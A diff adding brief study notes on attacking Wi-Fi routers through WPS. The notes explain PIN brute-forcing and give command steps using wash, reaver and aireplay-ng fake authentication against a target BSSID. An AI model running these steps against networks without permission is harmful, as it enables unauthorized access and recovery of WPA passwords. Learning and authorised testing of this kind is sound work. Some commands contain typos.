@@ -1,0 +1,12 @@
+WPS is a feature that can be used with WPA & WPA2. It allows clients to connect without a password.
+  - Authentication is done using an 8-digit pin.
+  - 8 digits is very small. We can try all possible pins in a relatively short time. 
+  - Then the WPS pin can be used to compute the actual password.
+PS: This only works if the router is configured not to use PBC (Push Button Authentication).
+
+1. TERM1 # Enable monitor mode
+2. TERM1 # wash --inerface <MonitorInterface> // display all the networks with WPS enabled
+3. CTL+c  // to stop
+4. TERM2 # reaver --bssid <bssid_taget_ap> --channel 1 --interface <MonitorInterface_mon0> -vvv --no-associate
+4. TERM1 # aireplay-ng --fakeauth 30 -a <BSSID_AP> -h <KLAI_MAC_MonitorInterface> <MonitorInterface_mon0>
+
